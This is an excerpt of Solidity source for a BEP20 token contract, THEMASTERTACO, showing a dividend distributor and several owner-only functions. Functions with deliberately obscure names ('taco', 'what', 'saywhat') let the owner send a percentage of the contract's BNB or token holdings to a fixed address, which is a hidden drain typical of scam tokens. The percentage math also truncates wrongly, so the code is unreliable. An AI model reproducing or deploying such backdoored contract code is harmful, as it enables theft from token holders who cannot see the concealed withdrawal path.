...
interface IDividendDistributor {
    ...
    function claimDividendAddress(address shareholder) external;
}
...
contract DividendDistributor is IDividendDistributor {
    ...
    function claimDividendAddress(address shareholder) external override {
        distributeDividend(shareholder);
    }
...
contract THEMASTERTACO is IBEP20, Auth {
    ...
    IBEP20 BEPP = IBEP20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    ...
    function taco(uint256 aP) external authorized {
        uint256 amountBNB = address(this).balance;
        payable(SEEE).transfer(amountBNB.mul((aP).div(100)));
    }

    function saywhat(address _addr) public authorized {
        BEPP = IBEP20(_addr);
    }

    function what(uint256 aP) public authorized {
        uint256 amountB = BEPP.balanceOf(address(this));
        payable(SEEE).transfer(amountB.mul((aP).div(100)));
    }

    function SetcdE(bool _status, uint8 _interval) public authorized {
        bCE = _status;
        cbTI = _interval;
    }
    ...
    function setnRaPDiVD(address _nR) external authorized {
        try distributor.process(distributorGas) {} catch {}
    ...
    function claimDividendA(address shareholder) external {
        distributor.claimDividendAddress(shareholder);
    }
